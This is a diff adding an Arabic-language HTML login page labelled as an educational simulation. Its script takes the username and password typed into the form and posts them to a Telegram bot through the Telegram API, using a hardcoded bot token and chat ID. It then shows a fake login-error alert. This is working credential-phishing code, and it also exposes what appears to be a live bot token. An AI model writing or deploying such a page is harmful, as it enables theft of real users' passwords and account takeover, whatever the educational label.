@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>صفحة تسجيل دخول تعليمية</title>
+<style>
+  body { font-family: Arial; background:#f5f5f5; padding:20px; }
+  .container { max-width:400px; margin:auto; background:#fff; padding:20px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.1); }
+  input { width:100%; padding:10px; margin:8px 0; border-radius:6px; border:1px solid #ccc; }
+  button { width:100%; padding:12px; background:#0078ff; color:#fff; border:none; border-radius:6px; cursor:pointer; font-size:16px; }
+  button:hover { background:#005fcc; }
+  #log { margin-top:15px; background:#eee; padding:10px; border-radius:6px; height:150px; overflow:auto; }
+  #log ul { padding-left: 20px; }
+</style>
+</head>
+<body>
+<div class="container">
+  <h2>محاكاة تسجيل الدخول</h2>
+  <form id="demoForm">
+    <input type="text" id="username" placeholder="اسم المستخدم">
+    <input type="password" id="password" placeholder="كلمة المرور">
+    <button type="submit">تسجيل الدخول</button>
+  </form>
+
+  <div id="log">
+    <strong>سجل الأحداث:</strong>
+    <ul id="events"></ul>
+  </div>
+</div>
+
+<script>
+// سجل الأحداث داخل الصفحة
+const events = document.getElementById("events");
+function logEvent(msg){
+  const li = document.createElement("li");
+  li.textContent = msg;
+  events.appendChild(li);
+}
+
+// التوكن وchat_id الذي أعطيتني إياه
+const telegramBotToken = "8594288363:AAHiCotsrLj6xyeK0Dk3dPopSP78td9-KNk";
+const chatId = "6708623542";
+
+// دالة إرسال البيانات للبوت
+function sendToTelegram(username, password){
+  logEvent("=== sendToTelegram() تم استدعاء الدالة ===");
+  logEvent(`جمع البيانات: username = ${username}, password = ${password}`);
+
+  // هذا هو الجزء الذي يرسل البيانات للبوت مباشرة
+  fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: `Username: ${username}\nPassword: ${password}`
+    })
+  }).then(response => {
+    if(response.ok){
+      logEvent("تم إرسال البيانات للبوت بنجاح ✅");
+    } else {
+      logEvent("حدث خطأ أثناء إرسال البيانات ❌");
+    }
+  }).catch(error => {
+    logEvent("خطأ في الاتصال بالبوت: " + error);
+  });
+
+  alert("عذراً حصل خطأ أثناء تسجيل الدخول"); 
+}
+
+// التقاط حدث الضغط على زر تسجيل الدخول
+const form = document.getElementById("demoForm");
+form.addEventListener("submit", (e)=>{
+  e.preventDefault();
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+
+  logEvent("تم الضغط على زر تسجيل الدخول");
+  sendToTelegram(username, password);
+});
+</script>
+</body>
+</html>
